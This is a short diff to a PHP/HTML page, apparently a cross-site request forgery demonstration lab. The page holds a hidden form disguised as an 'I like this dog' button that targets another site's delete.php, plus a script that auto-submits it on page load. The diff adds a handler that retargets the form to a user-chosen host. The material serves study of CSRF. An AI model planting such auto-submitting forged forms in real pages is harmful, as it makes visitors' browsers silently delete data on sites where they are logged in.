@@ -15,8 +15,8 @@
                 <?php unset($_GET['delete']); ?>
             <?php else: ?>
                 <!-- Form for deleting all pics-->
-                <form method="DELETE" action="http://ccc-xsrf.dev/delete.php" class="form-horizontal text-center hidden" id="xsrf_form">
-                        <button class="btn btn-success" type="submit" name="submit" id="xsrf_submit" >
+                <form method="DELETE" action="http://ccc-xsrf.dev/delete.php" class="form-horizontal text-center hidden" id="xsrf-form">
+                        <button class="btn btn-success" type="submit" name="submit" id="xsrf-submit" >
                             <i class="fa fa-btn fa-check"></i>I like this dog
                         </button>
                 </form>
@@ -24,7 +24,11 @@
                 <!-- Script for auto-submitting the form -->
                 <script>
                     $(window).load(function() {
-                        $("#xsrf_submit").click();
+                        $("#xsrf-submit").click();
+                    });
+                    $( "#host" ).on("change", function() {
+                        console.log($("#host").val());
+                        $("#xsrf-form").attr("action", $("#host").val() + "/delete.php");
                     });
                 </script>
             <?php endif; ?>
